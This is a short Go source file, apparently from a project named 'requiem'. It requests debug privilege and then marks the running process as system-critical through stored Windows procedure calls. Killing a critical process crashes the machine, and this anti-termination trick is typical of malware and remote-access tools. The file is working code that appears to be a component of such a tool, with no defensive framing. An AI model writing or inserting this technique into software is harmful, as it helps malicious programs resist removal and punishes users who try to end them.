package funcs

import (
	"unsafe"

	"requiem/store"
)

func SetCritical(critical bool) bool {
	if !store.IsAdmin {
		return false
	}

	var old int32

	ret, _, _ := store.AdjustPrivilege.Call(
		uintptr(20),
		uintptr(1),
		uintptr(0),
		uintptr(unsafe.Pointer(&old)),
	)

	if ret != 0 {
		return false
	}

	if critical {
		ret, _, _ = store.SetCritical.Call(uintptr(1), 0, 0)
	} else {
		ret, _, _ = store.SetCritical.Call(uintptr(0), 0, 0)
	}

	return ret == 0
}
